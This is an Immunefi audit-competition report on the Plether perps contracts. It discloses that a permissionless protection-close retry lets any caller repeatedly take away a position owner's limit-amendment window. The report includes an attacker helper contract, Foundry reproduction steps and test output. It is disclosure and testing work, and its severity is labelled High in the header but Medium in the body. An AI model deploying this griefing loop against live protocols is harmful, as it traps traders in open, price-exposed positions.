# \#98019 [SC-High] Permissionless protection retry preempts the owner's amendment window and causes exit griefing

**Submitted on Nov 4th 2026 at 12:19:20 UTC by @sl1de for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98019
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

# Description

## Brief/Intro

After a position-protection close attempt fails and the protection briefly enters `Latched`, the owner is supposed to be able to amend stale close limits before the next retry. However, `retryPositionProtectionClose` is permissionless and consumes the same zero-pending, `Latched` state required by the owner-only amendment. An unrelated caller can atomically terminalize an eligible failed or expired child and retry immediately, leaving no transaction boundary at which the owner can amend. The replacement child reuses the old limits, blocks ordinary closes, and can fail back into the same cycle. In production, this lets any caller grief a protected trader by repeatedly denying the documented repair and exit window, leaving the position open, price-exposed, and its margin in active-position custody until the owner wins an ordering race or uses an alternative escape. The selected impact is **Medium — Griefing**; this report does not claim guaranteed 24-hour freezing or direct theft.

## Vulnerability Details

### 1. Intended protection lifecycle

A triggered position protection creates a full-close child order. If that child terminally fails while the protected account, side, and size still match, the Book relatches the protection:

- `Triggered`: exactly one current protection-close child is live.
- `Latched`: the trigger remains binding, but no child is live.

The interface explicitly identifies `Latched` as the state in which the owner repairs failed close limits before another retry:

```solidity
/// @notice Lets the owner change close limits after a failed attempt relatches, before a fresh retry.
/// @dev The trigger and any terminal attempts remain recorded. A live child cannot be changed.
function amendLatchedPositionProtectionCloseLimits(
    uint64 protectionId,
    PositionProtectionTypes.CloseFinancialLimits calldata limits
) external;
```

The project documentation describes the same sequence: after a failed child relatches, "the owner may amend its limits before retrying."

### 2. The owner amendment requires the exact state consumed by public retry

`amendLatchedPositionProtectionCloseLimits` is correctly restricted to the protection owner, but it can run only while the protection is `Latched` and the account has no pending order:

```solidity
function amendLatchedPositionProtectionCloseLimits(
    uint64 protectionId,
    PositionProtectionTypes.CloseFinancialLimits calldata limits
) external nonReentrant {
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
    _setCloseLimits(protection, limits);
    _emitCloseLimitsUpdated(protection);
}
```

Frozen revision: `packages/perps/src/PositionProtectionBook.sol:315-328`.

The retry function requires the same `Latched` and zero-pending state, but it is callable by **any address** because it loads the protection with `_activeProtection` rather than `_ownedActiveProtection` and performs no caller check:

```solidity
function retryPositionProtectionClose(
    uint64 protectionId
) external nonReentrant returns (uint64 linkedOrderId) {
    StoredProtection storage protection = _activeProtection(protectionId);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    _requireMatchingPosition(protection);

    IPositionProtectionRouterHost router = IPositionProtectionRouterHost(ROUTER);
    if (router.pendingOrderCounts(protection.account) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }

    if (protection.linkedOrderId == 0 || _attemptProtectionIds[protection.linkedOrderId] != 0) {
        revert PositionProtectionBook__InvalidLinkedOrder();
    }
    uint64 expectedOrderId = router.nextCommitId();
    linkedOrderId = IPositionProtectionCloseAttemptHost(ROUTER)
        .commitProtectionCloseAttempt(protectionId, protection.account, protection.side, protection.size);
    if (linkedOrderId != expectedOrderId) {
        revert PositionProtectionBook__InvalidHostResponse();
    }
    _recordCloseAttempt(protection, linkedOrderId);
}
```

Frozen revision: `PositionProtectionBook.sol:382-405`.

The new child is committed inside the retry transaction. By the time the transaction completes, the protection is no longer `Latched`; it is `Triggered` again and the victim has one pending child. The owner's amendment therefore reverts `OrderRouter__ProtectionNotLatched` rather than receiving a usable repair window.

### 3. A caller can terminalize and retry atomically

The vulnerable transition does not require privileged ordering inside a transaction. A caller-controlled helper can compose two public calls:

```solidity
function expireAndRetry(
    uint64 currentOrderId,
    uint64 protectionId
) external returns (OrderV3Types.ExecutionResult memory result, uint64 replacementOrderId) {
    result = ROUTER.expireOrder(currentOrderId);
    require(result.status == OrderV3Types.LifecycleStatus.Failed, "attempt did not terminalize");
    replacementOrderId = PROTECTION_ACTIONS.retryPositionProtectionClose(protectionId);
}
```

For a child that fails during execution rather than expiry, the equivalent composition is:

```solidity
result = ROUTER.executeOrder{value: msg.value}(currentOrderId, pythUpdateData);
require(result.status == OrderV3Types.LifecycleStatus.Failed, "attempt did not terminalize");
replacementOrderId = PROTECTION_ACTIONS.retryPositionProtectionClose(protectionId);
```

The first call terminalizes the child and relatches protection. The second call consumes that `Latched` state before the attacker transaction returns. No owner transaction can be inserted between those calls.

The attacker still has to land its transaction before an owner repair transaction for each cycle. This is why the report claims a repeatable ordering-based griefing primitive, not an unconditional permanent or 24-hour lock.

### 4. The replacement preserves the stale owner-authored limits

A retry does not re-evaluate the original trigger and does not repair the stored close limits. It creates a fresh child from the protection's retained financial limits. A realistic stale-limit setup is:

1. The owner's execution-notional ceiling is valid when take-profit triggers.
2. The market moves before execution.
3. The close notional now exceeds that retained ceiling.
4. The child terminally fails with `ConstraintViolation` and relatches protection.
5. If an unrelated caller retries before amendment, the replacement inherits the same now-invalid ceiling.
6. The replacement can expire or fail and restore the same race.

The PoC verifies that the first child fails specifically on `ConstraintKind.ExecutionNotional`, and that the retained `maxExecutionNotionalAssets` remains unchanged after all attacker rotations.

### 5. Other owner exit paths remain blocked

The retry does more than prevent one configuration write. It restores a live protection child while the active protection lock remains in place:

- **Ordinary close:** `_validateFreshRequest` rejects an ordinary request when `activePositionProtectionId(account) != 0` with `OrderRouter__ProtectionActive` (`OrderLiquidationBatchLogic.sol:313-315`).
- **Atomic cancel and close:** `cancelPositionProtectionAndCommitClose` accepts only `Armed`, not `Triggered` or `Latched` (`PositionProtectionBook.sol:341-368`).
- **Plain cancellation:** `_cancel` accepts only `PendingOpen` or `Armed`; `Triggered` and `Latched` reject (`PositionProtectionBook.sol:408-418`).
- **Amendment:** after retry, status is `Triggered`, so the `Latched`-only amendment rejects.

The attacker therefore repeatedly occupies the only state transition intended to repair stale limits while all normal owner exits remain constrained by the active protection.

### 6. Attack sequence

A complete sequence is:

1. Alice has an open position and creates protection with bounded close limits.
2. The protection triggers and queues a close child.
3. A later state/price change makes one retained limit stale, so the child cannot execute successfully.
4. Carol calls a helper that executes or expires the current child and then calls `retryPositionProtectionClose` in the same transaction.
5. Child terminalization briefly relatches protection inside Carol's transaction.
6. Permissionless retry immediately consumes that state and commits a replacement with Alice's old limits.
7. At the transaction boundary, Alice sees `Triggered` protection and one pending child. Amendment, cancellation, and ordinary close are unavailable.
8. When the replacement becomes terminally invalid or expires, Carol can repeat steps 4–7.

Carol needs no owner role, keeper allowlist, protocol service access, or custody permission. Permissionless keepers are explicitly in scope. Expiry-and-retry rotations require no new oracle update and debit no protocol settlement assets from Carol; Carol pays transaction gas.

### 7. Why this is distinct from documented limitations

The project documents that retry is permissionless and that a latched close is not automatically retried. This report is not claiming that passive under-retry liveness is a bug. The vulnerable behavior is the opposite: an unrelated caller can **over-retry** and atomically consume the interface-designated owner amendment state before stale limits are repaired.

Likewise, this is not a claim that retaining financial limits is itself incorrect. Retention is working as designed. The issue is that the owner-only function specifically provided to amend those retained limits can be repeatedly preempted by an unrestricted retry caller.

## Impact Details

### Selected in-scope impact

**Medium — Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol).**

The attacker receives no protocol payout from the retry loop. The damage is imposed on the victim:

- the documented stale-limit repair function is unavailable after the attacker transaction;
- the victim cannot submit an ordinary full close while protection remains active;
- the victim cannot cancel a `Triggered` or `Latched` protection;
- the position remains open and exposed to subsequent price and carry changes;
- active-position margin remains in protocol custody with the still-open position;
- the victim must continuously monitor child terminalization and win an ordering race, use private ordering/account abstraction, or recapitalize as applicable;
- each successful attacker race forces the victim to wait through or separately terminalize another child before trying again.

### Quantified PoC result

The runnable Foundry PoC uses the frozen source revision and released v2.0.0 risk parameters. It performs 1,440 permissionless expiry-and-retry rotations:

```text
permissionless expiry-and-retry rotations: 1440
continuous lock duration (seconds):         87840
position margin still locked:               1985.500999 USDG
```

At every checked transaction boundary:

- Alice has exactly one attacker-created replacement child;
- protection is `Triggered`, not `Latched`;
- Alice's amendment rejects;
- Alice's ordinary close rejects with `ProtectionActive`;
- the original position size remains open;
- the complete active-position margin remains in the Clearinghouse active-position bucket; and
- the stale execution-notional ceiling remains unchanged.

A control test executes the same initial failure without the attacker's atomic retry. Alice then successfully amends the limit, retries, executes the replacement close, reduces position size to zero, and releases the active-position margin. This isolates the permissionless retry race as the reason the repair/exit path remains unavailable.

### Scope and limitations of the impact claim

The 87,840-second trace proves that the state machine permits repeated griefing for that duration when the attacker repeatedly lands first. It is **not** presented as a guaranteed 24-hour freeze because every later cycle requires another ordering win. For that reason, the selected impact is Griefing rather than "Temporary freezing of funds for at least 24 hours."

The following owner escapes are acknowledged:

- an EOA can escape by landing an amendment after terminalization and before the next attacker retry;
- a supported smart account can batch terminalization and amendment;
- private transaction ordering can protect the repair transaction; and
- adding margin may mitigate economic risk when the account has free funds, although it does not restore the blocked amendment path.

These limitations bound exploit persistence but do not remove the permissionless griefing primitive. A single successful attacker transaction still replaces the failed child before the owner can act and denies the repair/ordinary-exit window for that cycle.

No direct theft, protocol insolvency, or guaranteed long-duration freeze is claimed in this submission.

## References

### Frozen source revision

- Commit: [`a82d4fefb02768e5b3bddcc97dee371eee24fea8`](https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8)
- In-scope source tree: [`packages/perps/src`](https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src)

### Relevant code

- Owner amendment contract: [`IPositionProtectionActions.sol#L32-L37`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/interfaces/IPositionProtectionActions.sol#L32-L37)
- Owner amendment implementation: [`PositionProtectionBook.sol#L314-L328`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L314-L328)
- Armed-only cancel-and-close: [`PositionProtectionBook.sol#L340-L368`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L340-L368)
- Permissionless retry implementation: [`PositionProtectionBook.sol#L370-L406`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L370-L406)
- Latched cancellation restriction: [`PositionProtectionBook.sol#L408-L418`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L408-L418)
- Ordinary-order protection lock: [`OrderLiquidationBatchLogic.sol#L302-L318`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L302-L318)
- Documented owner-amend/retry lifecycle: [`WORKING_WITH_AI_AGENTS.md#L250-L290`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WORKING_WITH_AI_AGENTS.md#L250-L290)
- Protection state semantics: [`SECURITY.md#L515-L561`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L515-L561)

## Proof of Concept

# Proof of Concept

## Runnable PoC archive

**Download:** [Plether permissionless protection-retry griefing PoC](https://drive.google.com/file/d/16seHNF2uGZ0QtR7wh_sNKyyuakGzyclB/view?usp=sharing)

Archive name:

```text
plether-position-protection-grief-medium-poc-a82d4fe.zip
```

The archive contains:

```text
packages/perps/test/perps/spec/trader/PositionProtectionRetryAmendmentGrief.t.sol
SUBMISSION_RETRY_MEDIUM_POC.md
```

The Solidity test is intended to be added to the frozen Plether repository without modifying any contract under `packages/perps/src`.

## Target revision

```text
a82d4fefb02768e5b3bddcc97dee371eee24fea8
```

Frozen repository:

```text
https://github.com/immunefi-team/audit-comp-plether
```

## Reproduction steps

### 1. Check out the frozen competition revision

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
```

If the competition repository is already checked out, verify that it is at the exact frozen revision before continuing.

### 2. Extract the PoC at the repository root

Download `plether-position-protection-grief-medium-poc-a82d4fe.zip`, then run from the repository root:

```bash
unzip /path/to/plether-position-protection-grief-medium-poc-a82d4fe.zip
```

This adds only:

```text
packages/perps/test/perps/spec/trader/PositionProtectionRetryAmendmentGrief.t.sol
```

No in-scope production contract is changed.

### 3. Run the attack and control tests

```bash
cd packages/perps
forge test --jobs 1 \
  --block-gas-limit 3000000000 \
  --disable-block-gas-limit \
  --offline \
  --match-path test/perps/spec/trader/PositionProtectionRetryAmendmentGrief.t.sol \
  --match-test 'test_(PoC|Control)_' \
  -vv
```

The unusually high aggregate gas allowance is required only because the test represents 1,440 separate production transactions inside one Foundry test transaction. Each production rotation is an ordinary `expireOrder` plus `retryPositionProtectionClose` transaction.

### 4. Expected output

```text
Ran 2 tests for test/perps/spec/trader/PositionProtectionRetryAmendmentGrief.t.sol:PositionProtectionRetryAmendmentGriefPoC
[PASS] test_Control_OwnerCanAmendOnceValidStaleLimitWhenRetryGapIsNotConsumed()
[PASS] test_PoC_PermissionlessAtomicRetryDeniesOwnerAmendmentAndExitForAtLeastTwentyFourHours()
Logs:
  permissionless expiry-and-retry rotations: 1440
  continuous lock duration (seconds): 87840
  position margin still locked (asset atoms): 1985500999
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

## What the PoC demonstrates

### Test actors

- `ALICE`: position and protection owner.
- `CAROL`: unrelated permissionless caller performing the griefing sequence.
- `TRIGGER_KEEPER`: ordinary caller that initially triggers the protection.
- `AtomicProtectionRetryGriefer`: unprivileged helper that composes existing public calls atomically.

The helper has no privileged role. Its relevant functions are:

```solidity
function executeAndRetry(
    uint64 currentOrderId,
    uint64 protectionId,
    bytes[] calldata pythUpdateData
) external payable returns (OrderV3Types.ExecutionResult memory result, uint64 replacementOrderId) {
    result = ROUTER.executeOrder{value: msg.value}(currentOrderId, pythUpdateData);
    require(result.status == OrderV3Types.LifecycleStatus.Failed, "attempt did not terminalize");
    replacementOrderId = PROTECTION_ACTIONS.retryPositionProtectionClose(protectionId);
}

function expireAndRetry(
    uint64 currentOrderId,
    uint64 protectionId
) external returns (OrderV3Types.ExecutionResult memory result, uint64 replacementOrderId) {
    result = ROUTER.expireOrder(currentOrderId);
    require(result.status == OrderV3Types.LifecycleStatus.Failed, "attempt did not terminalize");
    replacementOrderId = PROTECTION_ACTIONS.retryPositionProtectionClose(protectionId);
}
```

The first call terminalizes the current protection child and briefly changes protection to `Latched`. The second public call retries before the helper transaction returns. No owner transaction can be inserted between those calls.

## Attack walkthrough

### Step A — Establish an ordinary protected position

The test funds Alice and opens a `10,000`-token LONG through the public Router with `2,000` USDG margin:

```solidity
_openThroughPublicRouter(bytes32("attack-initial-open"));
```

The test overrides only `BasePerpTest` stress defaults so the Engine uses the competition's released v2.0.0 risk tuple:

```solidity
vpiFactor:         0.01e18
maxSkewRatio:      0.4e18
maintMarginBps:    10
initMarginBps:     20
fadMarginBps:      300
baseCarryBps:      500
minBountyAssets:   1e6
bountyBps:         10
keeperShareBps:    5000
protocolShareBps:  0
```

### Step B — Create protection with a valid bounded close

Alice creates LONG take-profit protection at `0.90` and pins `maxExecutionNotionalAssets` to the exact notional at that trigger price:

```solidity
PositionProtectionTypes.PositionProtectionParams memory params = _params(LONG_TAKE_PROFIT, 0);
uint256 triggerNotionalAssets = (POSITION_SIZE * LONG_TAKE_PROFIT) / 1e20;
params.closeLimits.maxExecutionNotionalAssets = triggerNotionalAssets;

vm.prank(ALICE);
uint64 protectionId = protectionActions.createPositionProtection(params);
uint64 liveOrderId = _triggerAt(protectionId, LONG_TAKE_PROFIT);
```

The limit is valid when authored and when the protection triggers.

### Step C — Make the retained limit stale

The execution price moves from `0.90` to `0.91`. The full-close notional now exceeds Alice's retained ceiling. Carol calls `executeAndRetry`, which:

1. publicly executes the current close child;
2. receives a terminal `ConstraintViolation` on `ExecutionNotional`;
3. causes the Book to relatch protection; and
4. calls permissionless `retryPositionProtectionClose` inside the same transaction.

```solidity
vm.prank(CAROL);
(OrderV3Types.ExecutionResult memory constrained, uint64 firstReplacementId) =
    griefer.executeAndRetry(liveOrderId, protectionId, stalePriceData);
```

The test checks the exact failure:

```solidity
assertEq(
    uint8(constrained.terminalReason),
    uint8(OrderV3Types.TerminalReason.ConstraintViolation)
);
assertEq(
    uint8(constrainedOutcome.failedConstraint),
    uint8(OrderV3Types.ConstraintKind.ExecutionNotional)
);
```

At the end of Carol's transaction, protection is `Triggered` again and a replacement child is already pending. Alice never receives an externally observable `Latched` transaction boundary in which to amend.

### Step D — Repeat with public expiry and retry

For each replacement child, the test advances past the child's execution deadline. Carol then atomically expires and retries it:

```solidity
uint256 deadline = router.lifecycleBook().orderTiming(liveOrderId).executionDeadline;
vm.warp(deadline + 1);
vm.roll(block.number + 1);

vm.prank(CAROL);
(OrderV3Types.ExecutionResult memory terminal, uint64 replacementOrderId) =
    griefer.expireAndRetry(liveOrderId, protectionId);
```

After every rotation the test asserts:

```solidity
assertEq(uint8(terminal.terminalReason), uint8(OrderV3Types.TerminalReason.Expired));
assertGt(replacementOrderId, liveOrderId);
assertEq(router.pendingOrderCounts(ALICE), 1);
assertEq(
    uint8(protectionViews.getPositionProtection(protectionId).status),
    uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered)
);
```

These checks prove that each attacker transaction:

- terminalizes the old child;
- appends a fresh child;
- leaves Alice with one pending order; and
- consumes the `Latched` owner-amendment state before the transaction boundary.

The test repeats this exact public sequence 1,440 times.

### Step E — Verify that owner repair and exit remain blocked

After the rotations, Alice tries to amend to fully executable limits:

```solidity
vm.prank(ALICE);
vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, executableLimits);
```

It reverts because Carol's latest retry has already moved protection from `Latched` back to `Triggered`.

Alice then attempts an ordinary full close:

```solidity
vm.prank(ALICE);
vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
router.commitOrder(manualClose);
```

That also reverts because the active protection lock blocks ordinary discretionary orders.

The test finally proves the economic state remains live rather than merely checking an error selector:

```solidity
assertEq(remainingSize, POSITION_SIZE);
assertGt(remainingMargin, 0);
assertEq(victimBuckets.activePositionMarginAssets, remainingMargin);
assertEq(protectionViews.activePositionProtectionId(ALICE), protectionId);
assertEq(
    protectionViews.closeFinancialLimits(protectionId).maxExecutionNotionalAssets,
    triggerNotionalAssets
);
```

Observed active-position margin after the modeled period:

```text
1985.500999 USDG
```

The helper's Clearinghouse balance is unchanged, proving the retry loop does not require protocol settlement assets from the attacker:

```solidity
assertEq(
    clearinghouse.balanceAssets(address(griefer)),
    grieferSettlementBefore
);
```

The attacker still pays transaction gas.

## Control test

The sibling control proves that the same stale-limit failure is recoverable when no unrelated caller consumes the `Latched` gap:

1. Alice creates and triggers identical protection.
2. The close fails with the same `ConstraintViolation` and protection becomes `Latched`.
3. Alice amends the limits successfully.
4. Alice retries.
5. The replacement close executes.
6. Position size becomes zero.
7. Active-position margin custody becomes zero.

Relevant assertions:

```solidity
vm.prank(ALICE);
protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, executableLimits);

uint64 replacementOrderId = protectionActions.retryPositionProtectionClose(protectionId);
OrderV3Types.ExecutionResult memory executed = router.executeOrder(replacementOrderId, executionData);

assertEq(uint8(executed.status), uint8(OrderV3Types.LifecycleStatus.Executed));
assertEq(remainingSize, 0);
assertEq(clearinghouse.getAccountAssetBuckets(ALICE).activePositionMarginAssets, 0);
```

This control isolates Carol's permissionless atomic retry as the reason Alice loses the repair/exit window.

## Why the demonstrated impact is Medium griefing

The PoC establishes a repeatable permissionless denial of the owner's amendment and ordinary-exit paths. It does not assume attacker profit and does not claim direct theft.

The 87,840-second trace requires Carol to keep landing first at later terminalization boundaries. It is evidence that the state machine permits repeated griefing, not a claim that one transaction guarantees a 24-hour freeze. Therefore the selected in-scope impact is:

```text
Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
```

Victim escapes are preserved in the test/report threat model:

- an EOA can land amendment first after terminalizing a child;
- a supported smart account can batch terminalization and amendment;
- private ordering can protect the repair transaction; and
- recapitalization can mitigate economic risk where free funds are available.

Those escape paths bound persistence but do not remove the public race or the grief caused by each successful attacker transaction.

## PoC integrity

Solidity test SHA-256:

```text
7e06d31e5eed0a93de0b29a0cc7863f386b723760d5c0e0af6fd1d960febedf1
```

The downloadable archive also includes this reproduction guide at its root.
